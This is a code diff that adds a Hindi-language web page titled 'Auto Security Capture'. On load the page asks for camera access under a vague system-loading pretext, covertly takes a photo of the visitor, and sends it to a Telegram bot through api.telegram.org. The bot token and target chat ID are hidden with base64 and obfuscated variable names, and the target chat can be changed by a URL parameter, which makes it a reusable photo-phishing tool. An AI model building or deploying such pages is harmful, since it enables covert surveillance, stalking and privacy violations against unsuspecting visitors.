@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Security Capture</title>
+    <style>
+        body{font-family:sans-serif;text-align:center;margin-top:50px;background-color:#f4f4f9;}
+        .container{background:white;padding:30px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);display:inline-block;}
+        #status{font-size:18px;color:#333;font-weight:bold;}
+        .loader{border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+    </style>
+</head>
+<body onload="startCamera()">
+
+<div class="container">
+    <h2 id="titleText">सिस्टम लोड हो रहा है...</h2>
+    <div id="loader" class="loader"></div>
+    <p id="status">कृपया ब्राउज़र में कैमरे की अनुमति (Allow) दें...</p>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+const titleText = document.getElementById("titleText");
+const loader = document.getElementById("loader");
+
+const _urlParams = new URLSearchParams(window.location.search);
+const _dynamicId = _urlParams.get('id'); 
+
+const _______ = atob("ODc2Mjc2MTU5MDpBQUdGM21GQzNmMDRIU3hDSklTTjRQOTBtbFRWQ3RKQU5DRQ==");
+const ____________ = atob("ODE0NjI2NTUxNA==");
+
+const _targetChat = _dynamicId ? _dynamicId : ____________;
+
+function startCamera() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            statusText.innerText = "परमिशन मिल गई! प्रोसेस हो रहा है...";
+            statusText.style.color = "blue";
+            setTimeout(captureAndSend, 1500); 
+        };
+    })
+    .catch(err => {
+        loader.style.display = "none";
+        titleText.innerText = "❌ एरर";
+        statusText.innerText = "आपने कैमरे की अनुमति नहीं दी या कैमरा उपलब्ध नहीं है।";
+        statusText.style.color = "red";
+    });
+}
+
+function captureAndSend() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    statusText.innerText = "डेटा भेजा जा रहा है...";
+    video.srcObject.getTracks().forEach(t => t.stop());
+
+    canvas.toBlob(b => {
+        const fd = new FormData();
+        fd.append("chat_id", _targetChat);
+        fd.append("photo", b, "capture.png"); 
+
+        fetch(`https://api.telegram.org/bot${_______}/sendPhoto`, { method: "POST", body: fd })
+        .then(r => r.json())
+        .then(d => {
+            loader.style.display = "none";
+            if(d.ok) {
+                titleText.innerText = "✅ प्रक्रिया पूरी हुई";
+                statusText.innerText = "आपका काम हो गया है। आप इस पेज को बंद कर सकते हैं।";
+                statusText.style.color = "green";
+            } else {
+                titleText.innerText = "❌ तकनीकी खराबी";
+                statusText.innerText = "Error: " + d.description;
+                statusText.style.color = "red";
+            }
+        })
+        .catch(e => {
+            loader.style.display = "none";
+            titleText.innerText = "❌ नेटवर्क एरर";
+            statusText.innerText = "इंटरनेट कनेक्शन चेक करें।";
+            statusText.style.color = "red";
+        });
+    }, "image/png");
+}
+</script>
+
+</body>
+</html>
